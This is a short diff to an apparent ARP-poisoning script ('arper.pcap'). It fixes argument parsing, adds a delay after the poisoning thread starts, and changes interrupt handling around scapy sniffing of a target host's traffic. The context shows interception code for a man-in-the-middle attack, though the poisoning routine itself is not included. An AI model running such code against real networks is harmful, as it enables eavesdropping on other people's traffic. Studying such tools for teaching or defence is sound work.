@@ -79,7 +79,7 @@ def main():
     ns = getargs()
     gateway_ip = ns.gateway
     target_ip = ns.target
-    count = ns.count
+    count = int(ns.count)
     interface = ns.interface
     print (gateway_ip, target_ip, count, interface)
 
@@ -101,13 +101,14 @@ def main():
                                            target_mac))
     poisoning = True
     poison_thread.start()
+    time.sleep(2)
 
     try:
         print '[*] Starting sniffer for %d packets' % count
         bpf_filter = 'ip host %s' % target_ip
         packets = sniff(count=count, filter=bpf_filter, iface=interface)
-    except KeyboardInterrupt:
-        pass
+    except KeyboardInterrupt as err:
+        print str(err)
     finally:
         print'[*] Writing the packets...'
         wrpcap('arper.pcap', packets)
